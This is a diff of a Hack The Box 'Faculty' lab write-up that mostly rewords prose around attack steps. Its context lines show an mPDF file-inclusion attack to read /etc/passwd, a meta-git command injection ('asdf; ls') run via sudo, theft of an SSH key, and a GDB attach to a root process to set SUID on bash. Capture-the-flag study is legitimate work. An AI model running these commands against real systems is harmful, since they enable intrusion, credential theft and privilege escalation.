@@ -310,7 +310,7 @@ We get the following result:
 </table>
 ```
 
-We can POST using cURL:
+We can POST to this endpoint using cURL:
 
 ```shell
 $ curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw 'pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF' --compressed -L -vvv
@@ -325,13 +325,13 @@ EOT
 export ID=$(curl 'http://faculty.htb/admin/download.php' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Cookie: PHPSESSID=lbb7g4c7aqb8pjk8vo8g749ka3' -H 'Origin: http://faculty.htb' -H 'Referer: http://faculty.htb/admin/index.php?page=faculty' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' -H 'X-Requested-With: XMLHttpRequest' --data-raw pdf=$(cat /tmp/body))
 ```
 
-This returns the ID, so we can the full path like so (the `mpdf` file path can be found when downloading it from the browser):
+This returns the ID, so we can the full path like so (the `mpdf/tmp/` path can be found when downloading it from the browser):
 
 ```shell
 $ xdg-open "http://faculty.htb/mpdf/tmp/${ID}"
 ```
 
-This returns a PDF with the text "Hello, world!". MPDF has a file inclusion exploit (https://www.exploit-db.com/exploits/50995), let's try to get `/etc/passwd`:
+This returns a PDF with the text "Hello, world!". MPDF has a file inclusion exploit ([https://www.exploit-db.com/exploits/50995](https://www.exploit-db.com/exploits/50995)), so let's try to get `/etc/passwd`:
 
 ```shell
 cat <<EOT | jq -sRr @uri | base64 -w 0 > /tmp/body
@@ -553,7 +553,7 @@ User gbyolo may run the following commands on faculty:
     (developer) /usr/local/bin/meta-git
 ```
 
-As we can see, we can run `meta-git` as `developer`. `meta-git`, has a RCE vulnerability (https://hackerone.com/reports/728040):
+As we can see, we can run `meta-git` as `developer`. `meta-git`, has a RCE vulnerability ([https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)):
 
 ```shell
 $ sudo -u developer meta-git clone 'asdf; ls'
@@ -574,7 +574,7 @@ ls: command 'git clone ls ls' exited with error: Error: Command failed: git clon
 (node:63078) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
 ```
 
-We can use this to copy the SSH key to the tmp dir:
+We can use this to read the SSH key:
 
 ```shell
 $ cd /tmp
@@ -857,7 +857,7 @@ $ ps -U root -u root u | grep python
 root         719  0.0  0.8  26896 17940 ?        Ss   07:10   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
 ```
 
-And attach GDB, then run set the SUID bits for bash:
+And attach GDB, then run SUID bits for bash using the process running as root:
 
 ```shell
 $ gdb -p 719
